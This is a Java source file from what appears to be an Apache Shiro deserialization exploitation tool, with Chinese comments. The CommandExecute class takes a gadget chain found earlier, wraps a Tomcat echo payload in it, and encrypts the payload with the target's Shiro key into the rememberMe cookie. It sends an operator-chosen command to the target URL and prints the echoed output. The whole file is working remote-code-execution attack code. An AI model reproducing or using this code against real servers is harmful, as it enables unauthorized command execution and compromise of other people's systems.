package core;

import common.HttpUtils;
import common.PayloadEncrypt;
import entity.ControllersFactory;
import payloads.echo.TomcatEcho;
import payloads.util.Serializer;
import ui.MyController;
import java.lang.reflect.Method;
import java.util.Map;

public class CommandExecute {
    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;
    final private Map<String,byte[]> loaderByte = ControllersFactory.loaderByte;
    final private Map<String,Class> successGadget = ControllersFactory.successGadget;
    private HttpUtils httpUtils = new HttpUtils();

    // 首先我们需要从 successGadget 中获取利用链接
    public void tomcatCommandExecute(String gadget,String cmd) throws Exception {
        // 有一个问题，如何根据名字对应我们的类呢？
        Class gadgetClass = successGadget.get(gadget);
        // 如果不为null的话，就返回对应利用链，利用反射调用他们的方法
        if (gadgetClass != null){
            String k = paramContext.get("ShiroKey");
            if (k != null){
                String resp = null;
                String echoCookie = null;
                Method getObject = gadgetClass.getDeclaredMethod("getObject",byte[].class);
                getObject.setAccessible(true);
                byte[] bytes = Serializer.serialize(getObject.invoke(gadgetClass.newInstance(), TomcatEcho.tomcatEchoPayload())); // 利用反射进行调用
                //交给 shiro 进行加密
                String encryptType = this.paramContext.get("Encrypt");
                if (encryptType.equals("CBC")){
                    echoCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesCbcEncrypt(bytes,k);
                } else{
                    echoCookie = paramContext.get("rememberMe") + "=" + PayloadEncrypt.AesGcmEncrypt(bytes,k);
                }

//                放到后面
                if (paramContext.get("OutputType").equals("1")){
                    this.myController.result.appendText("Echo Cookie: " + echoCookie + "\n");
                    this.myController.result.appendText("Echo header: co0kie:" + cmd + "\n");
                }
                if (paramContext.get("Method").equals("GET")){
                    resp = this.httpUtils.getGetRequestResponse(paramContext.get("URL"),echoCookie,cmd);
                } else {
                    resp = this.httpUtils.getPostRequestResponse(paramContext.get("URL"),echoCookie,cmd);
                }

                this.myController.result.appendText("[+]命令: " +cmd + "\n");
                // 这里需要处理的，我们需要把结果放在 $$$ 之间
                if (resp.indexOf("$$$") != -1){
                    int start = resp.indexOf("$$$");
                    int end = resp.lastIndexOf("$$$");
                    String cmdResp = resp.substring(start+3,end);
                    this.myController.result.appendText(cmdResp);
                }else {
                    this.myController.result.appendText("[!] 未检测到回显标志符，请结合Payload输出模式进行手动排查\n");
                }
            }else {
                this.myController.result.appendText("[!] 请先获取对应的密钥！\n");
            }
        } else {
            this.myController.result.appendText("[!] 请先检测对应的利用链！\n");
        }
    }
}
